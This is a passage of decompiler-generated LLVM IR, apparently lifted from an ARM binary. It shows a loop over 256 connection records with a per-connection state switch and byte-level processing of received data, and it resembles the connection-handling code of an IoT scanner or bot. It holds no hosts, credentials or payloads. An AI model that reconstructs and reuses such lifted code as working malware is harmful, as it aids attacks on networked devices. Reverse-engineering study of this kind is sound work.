  %v0_f2fc = phi i32 [ %v1_f2e0, %bb411 ], [ %v0_f294, %dec_label_pc_f294 ]
  store i32 ptrtoint (i32* @global_var_212f4.134 to i32), i32* %r0.global-to-local, align 4
  %v3_f2f4 = mul i32 %v0_f2fc, 256
  store i32 %v3_f2f4, i32* %r3.global-to-local, align 4
  %v2_f2f8 = load i32, i32* @global_var_212f4.134, align 4
  store i32 %v2_f2f8, i32* %r1.global-to-local, align 4
  %v2_f300 = mul i32 %v0_f2fc, 288
  store i32 %v2_f300, i32* %r2.global-to-local, align 4
  %v2_f304 = add i32 %v2_f2f8, %v2_f300
  store i32 %v2_f304, i32* @r4, align 4
  %v1_f308 = add i32 %v2_f304, 12
  %v2_f308 = inttoptr i32 %v1_f308 to i32*
  %v3_f308 = load i32, i32* %v2_f308, align 4
  store i32 %v3_f308, i32* %ip.global-to-local, align 4
  %v2_f30c = icmp ne i32 %v3_f308, 0
  store i1 %v2_f30c, i1* %cpsr_c.global-to-local, align 1
  %v7_f30c = icmp eq i32 %v3_f308, 1
  store i1 %v7_f30c, i1* %cpsr_z.global-to-local, align 1
  %v2_f310 = xor i1 %v2_f30c, true
  %v3_f310 = or i1 %v7_f30c, %v2_f310
  br i1 %v3_f310, label %bb412, label %bb413

bb412:                                            ; preds = %dec_label_pc_f2f0
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb413

bb413:                                            ; preds = %dec_label_pc_f2f0, %bb412
  %v1_f330219 = phi i32 [ %v2_f2f8, %dec_label_pc_f2f0 ], [ 5, %bb412 ]
  %v2_f314 = xor i1 %v7_f30c, true
  %v3_f314 = and i1 %v2_f30c, %v2_f314
  br i1 %v3_f314, label %bb414, label %bb415

bb414:                                            ; preds = %bb413
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb415

bb415:                                            ; preds = %bb413, %bb414
  %v1_f330 = phi i32 [ %v1_f330219, %bb413 ], [ 30, %bb414 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f318 = icmp eq i32 %v3_f308, 0
  store i1 %v2_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f318, label %bb411, label %dec_label_pc_f320

dec_label_pc_f320:                                ; preds = %bb415
  store i32 ptrtoint (i32* @global_var_1f2a4.122 to i32), i32* %r2.global-to-local, align 4
  %v2_f324 = load i32, i32* @global_var_1f2a4.122, align 4
  store i32 %v2_f324, i32* %r3.global-to-local, align 4
  %v1_f328 = add i32 %v2_f304, 8
  %v2_f328 = inttoptr i32 %v1_f328 to i32*
  %v3_f328 = load i32, i32* %v2_f328, align 4
  store i32 %v3_f328, i32* %r2.global-to-local, align 4
  %v2_f32c = sub i32 %v2_f324, %v3_f328
  store i32 %v2_f32c, i32* %r3.global-to-local, align 4
  %v3_f330 = icmp uge i32 %v2_f32c, %v1_f330
  store i1 %v3_f330, i1* %cpsr_c.global-to-local, align 1
  %v9_f330 = icmp eq i32 %v2_f32c, %v1_f330
  store i1 %v9_f330, i1* %cpsr_z.global-to-local, align 1
  %v2_f334 = xor i1 %v3_f330, true
  %v3_f334 = or i1 %v9_f330, %v2_f334
  br i1 %v3_f334, label %dec_label_pc_f2a4, label %dec_label_pc_f338

dec_label_pc_f338:                                ; preds = %dec_label_pc_f320
  %v1_f338 = add i32 %v2_f304, 4
  %v2_f338 = inttoptr i32 %v1_f338 to i32*
  %v3_f338 = load i32, i32* %v2_f338, align 4
  store i32 %v3_f338, i32* %r0.global-to-local, align 4
  %v1_f33c = call i32 @function_1130c(i32 %v3_f338)
  store i32 %v1_f33c, i32* %r0.global-to-local, align 4
  %v0_f340 = load i32, i32* @r4, align 4
  %v1_f340 = add i32 %v0_f340, 12
  %v2_f340 = inttoptr i32 %v1_f340 to i32*
  %v3_f340 = load i32, i32* %v2_f340, align 4
  store i32 %v3_f340, i32* %r3.global-to-local, align 4
  %v2_f344 = icmp ugt i32 %v3_f340, 1
  store i1 %v2_f344, i1* %cpsr_c.global-to-local, align 1
  %v7_f344 = icmp eq i32 %v3_f340, 2
  store i1 %v7_f344, i1* %cpsr_z.global-to-local, align 1
  %v2_f348 = xor i1 %v2_f344, true
  %v3_f348 = or i1 %v7_f344, %v2_f348
  br i1 %v3_f348, label %bb416, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_f338
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f350298302 = add i32 %v0_f340, 4
  %v3_f350299303 = inttoptr i32 %v2_f350298302 to i32*
  store i32 -1, i32* %v3_f350299303, align 4
  br label %bb417

bb416:                                            ; preds = %dec_label_pc_f338
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f350295 = add i32 %v0_f340, 4
  %v3_f350296 = inttoptr i32 %v2_f350295 to i32*
  store i32 -1, i32* %v3_f350296, align 4
  %v4_f354 = load i32, i32* %r3.global-to-local, align 4
  %v5_f354 = load i32, i32* @r4, align 4
  %v6_f354 = add i32 %v5_f354, 12
  %v7_f354 = inttoptr i32 %v6_f354 to i32*
  store i32 %v4_f354, i32* %v7_f354, align 4
  %v4_f358 = load i32, i32* %r3.global-to-local, align 4
  %v5_f358 = trunc i32 %v4_f358 to i8
  %v6_f358 = load i32, i32* @r4, align 4
  %v7_f358 = add i32 %v6_f358, 284
  %v8_f358 = inttoptr i32 %v7_f358 to i8*
  store i8 %v5_f358, i8* %v8_f358, align 1
  %v0_f35c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f35c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb417

bb417:                                            ; preds = %.thread301, %bb416
  %v1_f35c = phi i1 [ %v1_f35c.pre, %bb416 ], [ %v2_f344, %.thread301 ]
  %v0_f35c = phi i1 [ %v0_f35c.pre, %bb416 ], [ false, %.thread301 ]
  %v2_f35c = xor i1 %v1_f35c, true
  %v3_f35c = or i1 %v0_f35c, %v2_f35c
  br i1 %v3_f35c, label %bb411, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %bb417
  %v0_f360 = load i32, i32* @r4, align 4
  %v1_f360 = add i32 %v0_f360, 284
  %v2_f360 = inttoptr i32 %v1_f360 to i8*
  %v3_f360 = load i8, i8* %v2_f360, align 1
  %v4_f360 = zext i8 %v3_f360 to i32
  %v1_f364 = add nuw nsw i32 %v4_f360, 1
  %v1_f368 = urem i32 %v1_f364, 256
  store i32 %v1_f368, i32* %r3.global-to-local, align 4
  %v2_f36c = icmp ugt i32 %v1_f368, 9
  store i1 %v2_f36c, i1* %cpsr_c.global-to-local, align 1
  %v7_f36c = icmp eq i32 %v1_f368, 10
  store i1 %v7_f36c, i1* %cpsr_z.global-to-local, align 1
  %v1_f370 = trunc i32 %v1_f364 to i8
  store i8 %v1_f370, i8* %v2_f360, align 1
  %v0_f374 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f374, label %.thread74, label %dec_label_pc_f384

.thread74:                                        ; preds = %dec_label_pc_f360
  %v1_f374 = load i32, i32* %r3.global-to-local, align 4
  %v2_f374 = add i32 %v1_f374, -10
  store i32 %v2_f374, i32* %r3.global-to-local, align 4
  %v2_f378 = load i32, i32* @r4, align 4
  %v3_f378 = add i32 %v2_f378, 12
  %v4_f378 = inttoptr i32 %v3_f378 to i32*
  store i32 %v2_f374, i32* %v4_f378, align 4
  %v1_f37c = load i32, i32* %r3.global-to-local, align 4
  %v2_f37c = trunc i32 %v1_f37c to i8
  %v3_f37c = load i32, i32* @r4, align 4
  %v4_f37c = add i32 %v3_f37c, 284
  %v5_f37c = inttoptr i32 %v4_f37c to i8*
  store i8 %v2_f37c, i8* %v5_f37c, align 1
  %v0_f380.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f380.pr.pr, label %bb411, label %dec_label_pc_f384

dec_label_pc_f384:                                ; preds = %dec_label_pc_f360, %.thread74
  %v0_f384 = load i32, i32* @r4, align 4
  store i32 %v0_f384, i32* @r0, align 4
  %v0_f388 = call i32 @function_e868()
  store i32 %v0_f388, i32* %r0.global-to-local, align 4
  br label %bb411

dec_label_pc_f390:                                ; preds = %dec_label_pc_f2a4
  store i32 %v3_f390, i32* %r0.global-to-local, align 4
  %v3_f394 = udiv i32 %v3_f390, 32
  %v3_f398 = mul nuw nsw i32 %v3_f394, 4
  store i32 %v2_f39c, i32* @lr, align 4
  %v2_f3a0 = add i32 %v3_f398, %v2_f39c
  store i32 %v2_f3a0, i32* %r3.global-to-local, align 4
  %v1_f3a4 = add i32 %v2_f3a0, -312
  %v2_f3a4 = inttoptr i32 %v1_f3a4 to i32*
  %v3_f3a4 = load i32, i32* %v2_f3a4, align 4
  %v1_f3a8 = urem i32 %v3_f390, 32
  store i32 %v1_f3a8, i32* %r1.global-to-local, align 4
  %v7_f3ac = shl i32 1, %v1_f3a8
  %v8_f3ac = or i32 %v3_f3a4, %v7_f3ac
  store i32 %v8_f3ac, i32* %r2.global-to-local, align 4
  %v0_f3b0 = load i32, i32* @r5, align 4
  %v3_f3b0 = icmp uge i32 %v0_f3b0, %v3_f390
  store i1 %v3_f3b0, i1* %cpsr_c.global-to-local, align 1
  %v9_f3b0 = icmp eq i32 %v0_f3b0, %v3_f390
  store i1 %v9_f3b0, i1* %cpsr_z.global-to-local, align 1
  %v5_f3b4 = icmp slt i32 %v0_f3b0, %v3_f390
  br i1 %v5_f3b4, label %bb418, label %bb419

bb418:                                            ; preds = %dec_label_pc_f390
  store i32 %v3_f390, i32* @r5, align 4
  br label %bb419

bb419:                                            ; preds = %dec_label_pc_f390, %bb418
  store i32 %v8_f3ac, i32* %v2_f3a4, align 4
  br label %bb411

dec_label_pc_f3c0:                                ; preds = %bb411
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f3cc = load i32, i32* @r5, align 4
  %v1_f3cc = load i32, i32* @r6, align 4
  %v3_f3cc = icmp uge i32 %v0_f3cc, %v1_f3cc
  store i1 %v3_f3cc, i1* %cpsr_c.global-to-local, align 1
  %v9_f3cc = icmp eq i32 %v0_f3cc, %v1_f3cc
  store i1 %v9_f3cc, i1* %cpsr_z.global-to-local, align 1
  %v5_f3d0 = icmp slt i32 %v0_f3cc, %v1_f3cc
  %storemerge157 = select i1 %v5_f3d0, i32 %v1_f3cc, i32 %v0_f3cc
  store i32 %v2_f3e4, i32* %ip.global-to-local, align 4
  store i32 %v2_f3e8, i32* %r1.global-to-local, align 4
  store i32 %v2_f3ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f3f4 = add i32 %storemerge157, 1
  store i32 %v1_f3f4, i32* %r0.global-to-local, align 4
  %v5_f400 = call i32 @function_11030(i32 %v1_f3f4, i32 %v2_f3e8, i32 %v2_f3ec, i32 0, i32 %v2_f3e4)
  %v0_f404 = load i32, i32* @r4, align 4
  store i32 %v0_f404, i32* %r0.global-to-local, align 4
  %v1_f408 = inttoptr i32 %v0_f404 to i32*
  %v2_f408 = call i32 @function_10f8c(i32* %v1_f408)
  store i32 %v2_f408, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f2a4.122 to i32), i32* @lr, align 4
  %v0_f410 = load i32, i32* @r4, align 4
  store i32 %v0_f410, i32* %stack_var_-52, align 4
  store i32 %v2_f408, i32* @global_var_1f2a4.122, align 4
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f588, %dec_label_pc_f3c0
  %v0_f424 = phi i32 [ %v1_f58c, %dec_label_pc_f588 ], [ %v0_f410, %dec_label_pc_f3c0 ]
  store i32 ptrtoint (i32* @global_var_212f4.134 to i32), i32* %r0.global-to-local, align 4
  %v3_f41c = mul i32 %v0_f424, 256
  store i32 %v3_f41c, i32* %r3.global-to-local, align 4
  %v2_f420 = load i32, i32* @global_var_212f4.134, align 4
  store i32 %v2_f420, i32* %r1.global-to-local, align 4
  %v2_f428 = mul i32 %v0_f424, 288
  store i32 %v2_f428, i32* %r2.global-to-local, align 4
  %v2_f42c = add i32 %v2_f420, %v2_f428
  store i32 %v2_f42c, i32* @r6, align 4
  %v1_f430 = add i32 %v2_f42c, 4
  %v2_f430 = inttoptr i32 %v1_f430 to i32*
  %v3_f430 = load i32, i32* %v2_f430, align 4
  store i32 %v3_f430, i32* %r0.global-to-local, align 4
  %v2_f434 = icmp eq i32 %v3_f430, -1
  store i1 %v2_f434, i1* %cpsr_c.global-to-local, align 1
  %v7_f434 = icmp eq i32 %v3_f430, -1
  store i1 %v7_f434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f434, label %dec_label_pc_f588, label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f418
  %v3_f43c = udiv i32 %v3_f430, 32
  store i32 %v2_f39c, i32* %r1.global-to-local, align 4
  %v3_f444 = mul nuw nsw i32 %v3_f43c, 4
  store i32 %v3_f444, i32* @ip, align 4
  %v2_f448 = add i32 %v3_f444, %v2_f39c
  store i32 %v2_f448, i32* %r2.global-to-local, align 4
  %v1_f44c = add i32 %v2_f448, -312
  %v2_f44c = inttoptr i32 %v1_f44c to i32*
  %v3_f44c = load i32, i32* %v2_f44c, align 4
  %v1_f450 = urem i32 %v3_f430, 32
  store i32 %v1_f450, i32* %r1.global-to-local, align 4
  %v2_f454 = add nsw i32 %v1_f450, -1
  %v3_f454 = shl i32 1, %v2_f454
  %v4_f454 = and i32 %v3_f44c, %v3_f454
  %v5_f454 = icmp ne i32 %v4_f454, 0
  store i1 %v5_f454, i1* %cpsr_c.global-to-local, align 1
  %v6_f454 = lshr i32 %v3_f44c, %v1_f450
  store i32 %v6_f454, i32* %r3.global-to-local, align 4
  %v1_f458 = urem i32 %v6_f454, 2
  %v2_f458 = icmp eq i32 %v1_f458, 0
  store i1 %v2_f458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f458, label %dec_label_pc_f460, label %dec_label_pc_fffc

dec_label_pc_f460:                                ; preds = %dec_label_pc_f43c, %dec_label_pc_100a0
  %v1_f46c = phi i32 [ %v1_f450, %dec_label_pc_f43c ], [ %v1_f46c.pre, %dec_label_pc_100a0 ]
  %v0_f464 = phi i32 [ %v3_f444, %dec_label_pc_f43c ], [ %v0_f464.pre, %dec_label_pc_100a0 ]
  store i32 %v2_f39c, i32* @lr, align 4
  %v2_f464 = add i32 %v0_f464, %v2_f39c
  store i32 %v2_f464, i32* %r2.global-to-local, align 4
  %v1_f468 = add i32 %v2_f464, -184
  %v2_f468 = inttoptr i32 %v1_f468 to i32*
  %v3_f468 = load i32, i32* %v2_f468, align 4
  %v2_f46c = add i32 %v1_f46c, -1
  %v3_f46c = shl i32 1, %v2_f46c
  %v4_f46c = and i32 %v3_f468, %v3_f46c
  %v5_f46c = icmp ne i32 %v4_f46c, 0
  store i1 %v5_f46c, i1* %cpsr_c.global-to-local, align 1
  %v6_f46c = lshr i32 %v3_f468, %v1_f46c
  store i32 %v6_f46c, i32* %r3.global-to-local, align 4
  %v1_f470 = urem i32 %v6_f46c, 2
  %v2_f470 = icmp eq i32 %v1_f470, 0
  store i1 %v2_f470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f470, label %dec_label_pc_f588, label %dec_label_pc_f478.preheader

dec_label_pc_f478.preheader:                      ; preds = %dec_label_pc_f460
  %v0_f478182 = load i32, i32* @r6, align 4
  %v1_f478183 = add i32 %v0_f478182, 12
  %v2_f478184 = inttoptr i32 %v1_f478183 to i32*
  %v3_f478185 = load i32, i32* %v2_f478184, align 4
  store i32 %v3_f478185, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f47c181187 = icmp eq i32 %v3_f478185, 0
  store i1 %v2_f47c181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f47c181187, label %dec_label_pc_f588, label %dec_label_pc_f484.lr.ph

dec_label_pc_f478.loopexit:                       ; preds = %dec_label_pc_f5d8, %dec_label_pc_f6e4
  %v0_f478 = load i32, i32* @r6, align 4
  %v1_f478 = add i32 %v0_f478, 12
  %v2_f478 = inttoptr i32 %v1_f478 to i32*
  %v3_f478 = load i32, i32* %v2_f478, align 4
  store i32 %v3_f478, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f47c181 = icmp eq i32 %v3_f478, 0
  store i1 %v2_f47c181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f47c181, label %dec_label_pc_f588, label %dec_label_pc_f484.lr.ph

dec_label_pc_f484.lr.ph:                          ; preds = %dec_label_pc_f478.preheader, %dec_label_pc_f478.loopexit
  %v0_f484235 = phi i32 [ %v0_f478, %dec_label_pc_f478.loopexit ], [ %v0_f478182, %dec_label_pc_f478.preheader ]
  br label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %dec_label_pc_f47c.backedge.thread, %dec_label_pc_f47c.backedge, %dec_label_pc_f47c.backedge.thread565, %dec_label_pc_f484.lr.ph
  %v0_ffc8 = phi i32 [ %v0_f484235, %dec_label_pc_f484.lr.ph ], [ %v0_f484232, %dec_label_pc_f47c.backedge ], [ %v0_f4fc, %dec_label_pc_f47c.backedge.thread ], [ %v0_f4fc, %dec_label_pc_f47c.backedge.thread565 ]
  %v1_f484 = add i32 %v0_ffc8, 24
  %v2_f484 = inttoptr i32 %v1_f484 to i32*
  %v3_f484 = load i32, i32* %v2_f484, align 4
  store i32 %v3_f484, i32* @r3, align 4
  %v2_f488 = icmp ugt i32 %v3_f484, 255
  store i1 %v2_f488, i1* %cpsr_c.global-to-local, align 1
  %v7_f488 = icmp eq i32 %v3_f484, 256
  store i1 %v7_f488, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_ffc8, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f488, label %dec_label_pc_ffc8, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f484, %dec_label_pc_ffc8
  store i32 %v0_f0a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f0c4, align 4
  %v0_f4a0 = load i32, i32* @r6, align 4
  %v1_f4a0 = add i32 %v0_f4a0, 24
  %v2_f4a0 = inttoptr i32 %v1_f4a0 to i32*
  %v3_f4a0 = load i32, i32* %v2_f4a0, align 4
  store i32 %v3_f4a0, i32* %r2.global-to-local, align 4
  %v0_f4a4 = load i32, i32* @fp, align 4
  %v2_f4a4 = add i32 %v0_f4a4, %v3_f4a0
  store i32 %v2_f4a4, i32* @r4, align 4
  %v1_f4a8 = add i32 %v0_f4a0, 4
  %v2_f4a8 = inttoptr i32 %v1_f4a8 to i32*
  %v3_f4a8 = load i32, i32* %v2_f4a8, align 4
  store i32 %v3_f4a8, i32* %r0.global-to-local, align 4
  %v1_f4ac = sub i32 256, %v3_f4a0
  store i32 %v1_f4ac, i32* %r2.global-to-local, align 4
  store i32 %v2_f4a4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f4b8 = call i32 @function_119bc(i32 %v3_f4a8, i32 %v2_f4a4, i32 %v1_f4ac, i32 16384)
  store i32 %v4_f4b8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4bc = icmp eq i32 %v4_f4b8, 0
  store i1 %v2_f4bc, i1* %cpsr_z.global-to-local, align 1
  %tmp420 = icmp slt i32 %v4_f4b8, 1
  br i1 %tmp420, label %dec_label_pc_f534, label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f494
  %v0_f4c4 = load i32, i32* @r5, align 4
  store i32 %v0_f4c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %.thread81, %dec_label_pc_f4c4
  %v3_f4d4 = phi i32 [ %v1_f4d8, %.thread81 ], [ %v0_f4c4, %dec_label_pc_f4c4 ]
  %v1_f4c8 = load i32, i32* @r4, align 4
  %v2_f4c8 = add i32 %v1_f4c8, %v3_f4d4
  %v3_f4c8 = inttoptr i32 %v2_f4c8 to i8*
  %v4_f4c8 = load i8, i8* %v3_f4c8, align 1
  %v6_f4c8 = zext i8 %v4_f4c8 to i32
  store i32 %v6_f4c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4cc = icmp eq i8 %v4_f4c8, 0
  store i1 %v2_f4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4cc, label %bb421, label %.thread81

bb421:                                            ; preds = %dec_label_pc_f4c8
  %v2_f4d0 = add nuw nsw i32 %v6_f4c8, 65
  store i32 %v2_f4d0, i32* %r3.global-to-local, align 4
  %v2_f4d4 = trunc i32 %v2_f4d0 to i8
  store i8 %v2_f4d4, i8* %v3_f4c8, align 1
  %v0_f4d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread81

.thread81:                                        ; preds = %dec_label_pc_f4c8, %bb421
  %v0_f4d8 = phi i32 [ %v3_f4d4, %dec_label_pc_f4c8 ], [ %v0_f4d8.pre, %bb421 ]
  %v1_f4d8 = add i32 %v0_f4d8, 1
  store i32 %v1_f4d8, i32* %r2.global-to-local, align 4
  %v3_f4dc = icmp uge i32 %v1_f4d8, %v4_f4b8
  store i1 %v3_f4dc, i1* %cpsr_c.global-to-local, align 1
  %v9_f4dc = icmp eq i32 %v1_f4d8, %v4_f4b8
  store i1 %v9_f4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f4dc, label %dec_label_pc_f4e4, label %dec_label_pc_f4c8

dec_label_pc_f4e4:                                ; preds = %.thread81, %dec_label_pc_f538
  store i32 ptrtoint (i32* @global_var_1f2a4.122 to i32), i32* @ip, align 4
  %v0_f4e8 = load i32, i32* @r6, align 4
  %v1_f4e8 = add i32 %v0_f4e8, 24
  %v2_f4e8 = inttoptr i32 %v1_f4e8 to i32*
  %v3_f4e8 = load i32, i32* %v2_f4e8, align 4
  %v2_f4ec = load i32, i32* @global_var_1f2a4.122, align 4
  store i32 %v2_f4ec, i32* %r2.global-to-local, align 4
  %v2_f4f0 = add i32 %v3_f4e8, %v4_f4b8
  store i32 %v2_f4f0, i32* %r3.global-to-local, align 4
  store i32 %v2_f4f0, i32* %v2_f4e8, align 4
  %v0_f4f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f4f8 = load i32, i32* @r6, align 4
  %v2_f4f8 = add i32 %v1_f4f8, 8
  %v3_f4f8 = inttoptr i32 %v2_f4f8 to i32*
  store i32 %v0_f4f8, i32* %v3_f4f8, align 4
  br label %dec_label_pc_f4fc

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f6ec, %dec_label_pc_f4e4
  %v0_f4fc = load i32, i32* @r6, align 4
  %v1_f4fc = add i32 %v0_f4fc, 12
  %v2_f4fc = inttoptr i32 %v1_f4fc to i32*
  %v3_f4fc = load i32, i32* %v2_f4fc, align 4
  store i32 %v3_f4fc, i32* %r0.global-to-local, align 4
  %v1_f500 = add i32 %v3_f4fc, -2
  store i32 %v1_f500, i32* @r3, align 4
  %v7_f504 = icmp eq i32 %v1_f500, 8
  store i1 %v7_f504, i1* %cpsr_z.global-to-local, align 1
  %v5_f508 = and i32 %v1_f500, 1073741824
  %v6_f508 = icmp ne i32 %v5_f508, 0
  store i1 %v6_f508, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f4fc, label %dec_label_pc_f47c.backedge [
    i32 2, label %dec_label_pc_f7e8
    i32 3, label %dec_label_pc_fd70
    i32 4, label %dec_label_pc_fbb0
    i32 5, label %dec_label_pc_f98c
    i32 6, label %dec_label_pc_f8b8
    i32 7, label %dec_label_pc_fc9c
    i32 8, label %dec_label_pc_fadc
    i32 9, label %dec_label_pc_f714
    i32 10, label %dec_label_pc_f5a0
  ]

dec_label_pc_f534:                                ; preds = %dec_label_pc_f494
  br i1 %v2_f4bc, label %dec_label_pc_10224, label %dec_label_pc_f538

dec_label_pc_f538:                                ; preds = %dec_label_pc_f534
  %v3_f538 = icmp eq i32 %v4_f4b8, -1
  store i1 %v3_f538, i1* %cpsr_c.global-to-local, align 1
  %v8_f538 = icmp eq i32 %v4_f4b8, -1
  store i1 %v8_f538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f538, label %dec_label_pc_f540, label %dec_label_pc_f4e4

dec_label_pc_f540:                                ; preds = %dec_label_pc_f538
  store i32 %v0_f0a8, i32* %r2.global-to-local, align 4
  %v2_f544 = load i32, i32* %v2_f0c4, align 4
  store i32 %v2_f544, i32* %r3.global-to-local, align 4
  %v2_f548 = icmp ugt i32 %v2_f544, 10
  store i1 %v2_f548, i1* %cpsr_c.global-to-local, align 1
  %v7_f548 = icmp eq i32 %v2_f544, 11
  store i1 %v7_f548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f548, label %dec_label_pc_f588, label %dec_label_pc_f550

dec_label_pc_f550:                                ; preds = %dec_label_pc_f540, %dec_label_pc_10224
  %v0_f550 = load i32, i32* @r6, align 4
  %v1_f550 = add i32 %v0_f550, 4
  %v2_f550 = inttoptr i32 %v1_f550 to i32*
  %v3_f550 = load i32, i32* %v2_f550, align 4
  store i32 %v3_f550, i32* %r0.global-to-local, align 4
  %v1_f554 = call i32 @function_1130c(i32 %v3_f550)
  store i32 %v1_f554, i32* %r0.global-to-local, align 4
  %v0_f558 = load i32, i32* @r6, align 4
  %v1_f558 = add i32 %v0_f558, 284
  %v2_f558 = inttoptr i32 %v1_f558 to i8*
  %v3_f558 = load i8, i8* %v2_f558, align 1
  %v4_f558 = zext i8 %v3_f558 to i32
  %v1_f55c = add nuw nsw i32 %v4_f558, 1
  %v1_f560 = urem i32 %v1_f55c, 256
  store i32 %v1_f560, i32* %r3.global-to-local, align 4
  %v2_f564 = icmp ugt i32 %v1_f560, 8
  store i1 %v2_f564, i1* %cpsr_c.global-to-local, align 1
  %v7_f564 = icmp eq i32 %v1_f560, 9
  store i1 %v7_f564, i1* %cpsr_z.global-to-local, align 1
  %v1_f568 = trunc i32 %v1_f55c to i8
  store i8 %v1_f568, i8* %v2_f558, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f570 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f570 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f570 = xor i1 %v1_f570, true
  %v3_f570 = and i1 %v0_f570, %v2_f570
  br i1 %v3_f570, label %bb422, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f550
  %v1_f574309314 = load i32, i32* @r6, align 4
  %v2_f574310315 = add i32 %v1_f574309314, 4
  %v3_f574311316 = inttoptr i32 %v2_f574310315 to i32*
  store i32 -1, i32* %v3_f574311316, align 4
  br label %bb423

bb422:                                            ; preds = %dec_label_pc_f550
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f574305 = load i32, i32* @r6, align 4
  %v2_f574306 = add i32 %v1_f574305, 4
  %v3_f574307 = inttoptr i32 %v2_f574306 to i32*
  store i32 -1, i32* %v3_f574307, align 4
  %v4_f578 = load i32, i32* %r3.global-to-local, align 4
  %v5_f578 = load i32, i32* @r6, align 4
  %v6_f578 = add i32 %v5_f578, 12
  %v7_f578 = inttoptr i32 %v6_f578 to i32*
  store i32 %v4_f578, i32* %v7_f578, align 4
  %v4_f57c = load i32, i32* %r3.global-to-local, align 4
  %v5_f57c = trunc i32 %v4_f57c to i8
  %v6_f57c = load i32, i32* @r6, align 4
  %v7_f57c = add i32 %v6_f57c, 284
  %v8_f57c = inttoptr i32 %v7_f57c to i8*
  store i8 %v5_f57c, i8* %v8_f57c, align 1
  %v0_f580.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f580.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb423

bb423:                                            ; preds = %.thread313, %bb422
  %v1_f584 = phi i1 [ %v1_f580.pre, %bb422 ], [ %v0_f570, %.thread313 ]
  %v0_f584 = phi i1 [ %v0_f580.pre, %bb422 ], [ %v1_f570, %.thread313 ]
  %v2_f580 = xor i1 %v1_f584, true
  %v3_f580 = or i1 %v0_f584, %v2_f580
  br i1 %v3_f580, label %bb424, label %bb425

bb424:                                            ; preds = %bb423
  %v4_f580 = load i32, i32* @r6, align 4
  store i32 %v4_f580, i32* %r0.global-to-local, align 4
  br label %bb425

bb425:                                            ; preds = %bb423, %bb424
  store i32 62856, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f580, i32 ptrtoint (i32* @global_var_e868.186 to i32))
  br label %dec_label_pc_f588

dec_label_pc_f588:                                ; preds = %dec_label_pc_f478.loopexit, %dec_label_pc_f47c.backedge, %dec_label_pc_f478.preheader, %dec_label_pc_f540, %dec_label_pc_f460, %dec_label_pc_f418, %dec_label_pc_100c0, %bb425
  %v3_f588 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f588, i32* %r3.global-to-local, align 4
  %v1_f58c = add i32 %v3_f588, 1
  store i32 %v1_f58c, i32* @r4, align 4
  %v2_f590 = icmp ugt i32 %v1_f58c, 254
  store i1 %v2_f590, i1* %cpsr_c.global-to-local, align 1
  %v7_f590 = icmp eq i32 %v1_f58c, 255
  store i1 %v7_f590, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f58c, i32* %stack_var_-52, align 4
  %v7_f598 = icmp slt i32 %v1_f58c, 256
  br i1 %v7_f598, label %dec_label_pc_f418, label %dec_label_pc_ed94

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f4fc
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f5a4 = call i32 @function_1030c(i32 10)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
